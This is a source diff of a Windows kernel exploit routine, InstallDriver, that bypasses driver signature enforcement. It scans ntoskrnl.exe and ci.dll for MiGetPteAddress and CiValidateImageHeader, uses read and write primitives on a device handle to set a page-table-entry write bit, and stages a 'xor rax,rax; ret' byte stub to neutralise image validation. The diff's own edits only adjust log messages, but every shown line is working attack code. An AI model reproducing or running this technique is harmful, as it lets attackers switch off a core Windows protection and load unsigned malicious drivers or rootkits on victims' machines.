@@ -45,17 +45,15 @@ BOOL InstallDriver(HANDLE device, char* driverPath, char* serviceName) {
     BOOL patched    = FALSE;
 
     PVOID ciMap = MapFileIntoMemory("C:\\Windows\\System32\\ci.dll");
-    printf("[*] ciMap (User-mode allocation): 0x%p\n", ciMap);
     PVOID kernelMap = MapFileIntoMemory("C:\\Windows\\System32\\ntoskrnl.exe");
-    printf("[*] kernelMap (User-mode allocation): 0x%p\n", kernelMap);
 
     int                 sigCount;
     const CiSigVariant* ciSigs = GetCiValidateImageHeaderSigs(&sigCount);
 
     DWORD64 kernelBase = GetKernelBaseAddress();
     DWORD64 ciBase     = GetCIBaseAddress();
-    printf("[*] Real Kernel Base (ntoskrnl.exe): 0x%I64X\n", kernelBase);
-    printf("[*] Real CI Base (CI.dll):            0x%I64X\n", ciBase);
+    printf("[*] Kernel Base (ntoskrnl.exe): 0x%I64X\n", kernelBase);
+    printf("[*] CI Base (CI.dll):            0x%I64X\n", ciBase);
 
     ULONG_PTR gadgetSearch = SearchSignatureInSection(
         (char*)".text", (char*)kernelMap,
@@ -67,14 +65,12 @@ BOOL InstallDriver(HANDLE device, char* driverPath, char* serviceName) {
     ULONG_PTR MiGetPteAddress       = gadgetSearch - (ULONG_PTR)kernelMap + kernelBase;
     ULONG_PTR targetConstantAddress = MiGetPteAddress + sizeof(MiGetPteAddressSig);
     printf("[+] MiGetPteAddress:       0x%p\n", (void*)MiGetPteAddress);
-    printf("[+] targetConstantAddress: 0x%p\n", (void*)targetConstantAddress);
 
     for (int i = 0; i < sigCount; i++) {
         gadgetSearch = SearchSignatureInSection(
             (char*)"PAGE", (char*)ciMap,
             (char*)ciSigs[i].sig, ciSigs[i].len);
         if (gadgetSearch) {
-            printf("[+] CiValidateImageHeader matched: %s\n", ciSigs[i].name);
             break;
         }
     }
@@ -92,13 +88,13 @@ BOOL InstallDriver(HANDLE device, char* driverPath, char* serviceName) {
 
     ULONG_PTR currentPteValue  = ReadMemoryDWORD64(device, pteAddress);
     printf("[+] Current PTE value:               0x%016I64X\n", (DWORD64)currentPteValue);
+    printf("[+] Setting write bit to PTE.\n");
     ULONG_PTR writablePteValue = currentPteValue | 2;
     if (!WriteMemory(device, pteAddress, &writablePteValue, sizeof(writablePteValue))) {
         printf("[-] Failed to flip PTE write bit: %lu\n", GetLastError());
         goto cleanup;
     }
-    printf("[+] PTE write bit set:               0x%016I64X -> 0x%016I64X\n",
-           (DWORD64)currentPteValue, (DWORD64)writablePteValue);
+    printf("[+] PTE write bit set successfully.\n");
     pteFlipped = TRUE;
 
     char      retShell[] = { 0x48, 0x31, 0xc0, 0xc3 };
